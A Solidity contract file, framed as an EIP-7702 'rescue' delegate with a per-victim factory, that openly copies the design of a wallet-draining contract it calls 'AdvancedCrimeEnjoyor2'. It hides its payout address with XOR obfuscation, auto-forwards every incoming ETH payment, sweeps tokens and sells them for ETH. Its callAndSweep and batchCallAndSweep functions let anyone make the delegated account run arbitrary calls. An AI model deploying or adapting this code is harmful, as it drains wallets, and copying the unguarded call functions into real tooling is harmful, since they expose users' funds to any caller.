// SPDX-License-Identifier: MIT
pragma solidity 0.8.31;

/// @notice Minimal ERC20 interface used by the delegate.
interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
}

/// @notice Uniswap V2 router (supporting fee-on-transfer tokens).
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

/// @notice Uniswap V3 router (single-pool exact input).
interface IUniswapV3Router {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24  fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams calldata params)
        external
        payable
        returns (uint256 amountOut);
}

/// @notice WETH9 interface for unwrap.
interface IWETH9 {
    function balanceOf(address) external view returns (uint256);
    function withdraw(uint256) external;
}

/// @title RescueDelegatorV2
/// @notice EIP-7702 delegate with IMMUTABLE destination (like AdvancedCrimeEnjoyor2)
/// @dev Key improvements:
///      1. Immutable destination via XOR (a ^ b) - NO storage writes needed
///      2. Auto-forward in receive() - catches any incoming ETH automatically
///      3. Efficient gas usage - direct call without storage reads
///
///      Deploy pattern: Deploy new instance with unique (a, b) pair for each destination
contract RescueDelegatorV2 {
    // ---------- Custom errors ----------
    error TransferFailed(address token, address to, uint256 amount);
    error ZeroDestination();
    error RouterCallFailed(bytes reason);
    error ApproveFailed(address token, address spender, uint256 amount);

    // ---------- Events for monitoring ----------
    event ETHSwept(uint256 amount, bool success);
    event TokenSwept(address token, uint256 amount, bool success);

    // ---------- Mainnet constants ----------
    address internal constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant UNISWAP_V3_ROUTER = 0xE592427A0AEce92De3Edee1F18E0157C05861564;
    address internal constant WETH9_ADDRESS     = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    // ---------- Immutable destination (XOR obfuscated like AdvancedCrimeEnjoyor2) ----------
    /// @dev Destination = a ^ b (computed at runtime from immutables)
    /// This avoids storing destination in plain text and enables per-victim deployment
    bytes32 immutable a;
    bytes32 immutable b;

    /// @param _a First part of XOR pair
    /// @param _b Second part of XOR pair (a ^ b should equal destination address padded to bytes32)
    constructor(bytes32 _a, bytes32 _b) {
        a = _a;
        b = _b;
        // Validate destination is not zero
        if (uint160(uint256(_a ^ _b)) == 0) revert ZeroDestination();
    }

    // ---------- Destination getter ----------

    /// @notice Get the destination address (computed from immutables)
    function destination() public view returns (address payable) {
        return payable(address(uint160(uint256(a ^ b))));
    }

    // ---------- Auto-forward receive (CRITICAL for rescue) ----------

    /// @notice Auto-forward any incoming ETH to destination
    /// @dev This is the KEY feature - catches ETH from incoming transactions automatically
    receive() external payable {
        _forwardETH();
    }

    /// @notice Fallback also forwards ETH (catches edge cases)
    fallback() external payable {
        _forwardETH();
    }

    // ---------- Explicit sweep functions ----------

    /// @notice Sweep all ETH balance to destination
    /// @dev Called via Type 4 TX to sweep existing balance
    function sweepETH() external {
        _forwardETH();
    }

    /// @notice Sweep msg.value to destination (like AdvancedCrimeEnjoyor2's 0x2c7bddf4)
    /// @dev Useful when called in same TX as authorization
    function sweepETHValue() external payable {
        _forwardETH();
    }

    /// @notice Sweep full ERC20 balance to destination
    function sweepToken(address token) external {
        address payable dest = destination();
        uint256 bal = IERC20Minimal(token).balanceOf(address(this));
        if (bal == 0) return;

        _safeTransfer(token, dest, bal);
        emit TokenSwept(token, bal, true);
    }

    /// @notice Sweep ERC20 by chunks for fee-on-transfer/anti-whale tokens
    function sweepTokenChunked(
        address token,
        uint256 minimalChunk,
        uint256 maxIterations
    ) external {
        address payable dest = destination();

        uint256 i;
        while (i < maxIterations) {
            uint256 bal = IERC20Minimal(token).balanceOf(address(this));
            if (bal == 0) break;

            uint256 attempt = bal < minimalChunk ? bal : minimalChunk;
            _safeTransfer(token, dest, attempt);
            unchecked { ++i; }
        }
    }

    // ---------- DEX routes (sell-to-ETH then forward) ----------

    /// @notice Sell on Uniswap V2 and forward ETH to destination
    function sellToETH_V2(
        address tokenIn,
        uint256 amountIn,
        uint256 amountOutMinETH,
        uint256 deadline
    ) external {
        address payable dest = destination();

        _approveIfNeeded(tokenIn, UNISWAP_V2_ROUTER, amountIn);

        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = WETH9_ADDRESS;

        try IUniswapV2Router02(UNISWAP_V2_ROUTER)
            .swapExactTokensForETHSupportingFeeOnTransferTokens(
                amountIn, amountOutMinETH, path, dest, deadline
            )
        { } catch (bytes memory reason) {
            revert RouterCallFailed(reason);
        }
    }

    /// @notice Sell on Uniswap V3 and forward ETH to destination
    function sellToETH_V3(
        address tokenIn,
        uint24  poolFee,
        uint256 amountIn,
        uint256 amountOutMinETH,
        uint256 deadline
    ) external {
        address payable dest = destination();

        _approveIfNeeded(tokenIn, UNISWAP_V3_ROUTER, amountIn);

        IUniswapV3Router.ExactInputSingleParams memory p = IUniswapV3Router.ExactInputSingleParams({
            tokenIn: tokenIn,
            tokenOut: WETH9_ADDRESS,
            fee: poolFee,
            recipient: address(this),
            deadline: deadline,
            amountIn: amountIn,
            amountOutMinimum: amountOutMinETH,
            sqrtPriceLimitX96: 0
        });

        uint256 out = IUniswapV3Router(UNISWAP_V3_ROUTER).exactInputSingle{value: 0}(p);
        if (out > 0) {
            IWETH9(WETH9_ADDRESS).withdraw(out);
            (bool ok, ) = dest.call{value: out}("");
            emit ETHSwept(out, ok);
        }
    }

    // ---------- Batch operations (like AdvancedCrimeEnjoyor2) ----------

    /// @notice Execute batch of calls then sweep ETH
    /// @param targets Array of target addresses
    /// @param data Array of calldata for each target
    function batchCallAndSweep(
        address[] calldata targets,
        bytes[] calldata data
    ) external {
        require(targets.length == data.length, "Length mismatch");

        for (uint256 i = 0; i < targets.length; i++) {
            (bool success, ) = targets[i].call(data[i]);
            // Continue even if individual call fails
        }

        // Always sweep at the end
        _forwardETH();
    }

    /// @notice Execute single call then sweep ETH
    function callAndSweep(address target, bytes calldata data) external {
        (bool success, ) = target.call(data);
        _forwardETH();
    }

    // ---------- Internal helpers ----------

    /// @dev Forward all ETH to destination
    function _forwardETH() internal {
        address payable dest = destination();
        uint256 bal = address(this).balance;

        if (bal == 0) {
            emit ETHSwept(0, true);
            return;
        }

        (bool ok, ) = dest.call{value: bal}("");
        emit ETHSwept(bal, ok);
    }

    /// @dev Safe ERC20 transfer (accepts tokens that return no/true)
    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(
            abi.encodeWithSelector(bytes4(keccak256("transfer(address,uint256)")), to, amount)
        );
        bool pass = ok && (ret.length == 0 || (ret.length == 32 && abi.decode(ret, (bool))));
        if (!pass) revert TransferFailed(token, to, amount);
    }

    /// @dev Increase allowance only if needed; reset to 0 first for maximum compatibility
    function _approveIfNeeded(address token, address spender, uint256 requiredAmount) internal {
        uint256 current = IERC20Minimal(token).allowance(address(this), spender);
        if (current >= requiredAmount) return;

        (bool ok1, bytes memory ret1) = token.call(
            abi.encodeWithSelector(IERC20Minimal.approve.selector, spender, 0)
        );
        bool pass1 = ok1 && (ret1.length == 0 || (ret1.length == 32 && abi.decode(ret1, (bool))));
        if (!pass1) revert ApproveFailed(token, spender, 0);

        (bool ok2, bytes memory ret2) = token.call(
            abi.encodeWithSelector(IERC20Minimal.approve.selector, spender, requiredAmount)
        );
        bool pass2 = ok2 && (ret2.length == 0 || (ret2.length == 32 && abi.decode(ret2, (bool))));
        if (!pass2) revert ApproveFailed(token, spender, requiredAmount);
    }
}

/// @title RescueDelegatorV2Factory
/// @notice Factory for deploying per-victim RescueDelegatorV2 instances
/// @dev Each victim gets a unique delegate with hardcoded destination
contract RescueDelegatorV2Factory {
    event DelegateDeployed(address indexed delegate, address indexed destination, bytes32 a, bytes32 b);

    /// @notice Deploy a new RescueDelegatorV2 for a specific destination
    /// @param dest The destination address for rescued funds
    /// @return delegate The deployed delegate contract address
    function deployForDestination(address dest) external returns (address delegate) {
        require(dest != address(0), "Zero destination");

        // Generate XOR pair: use random-looking a, compute b = a ^ dest
        // Using blockhash for some uniqueness (not security critical)
        bytes32 _a = keccak256(abi.encodePacked(block.timestamp, block.prevrandao, dest, msg.sender));
        bytes32 _b = _a ^ bytes32(uint256(uint160(dest)));

        delegate = address(new RescueDelegatorV2(_a, _b));
        emit DelegateDeployed(delegate, dest, _a, _b);
    }

    /// @notice Deploy with custom XOR values (for deterministic deployment)
    /// @param _a First XOR component
    /// @param _b Second XOR component (a ^ b = destination)
    function deployWithXOR(bytes32 _a, bytes32 _b) external returns (address delegate) {
        delegate = address(new RescueDelegatorV2(_a, _b));
        emit DelegateDeployed(delegate, address(uint160(uint256(_a ^ _b))), _a, _b);
    }
}
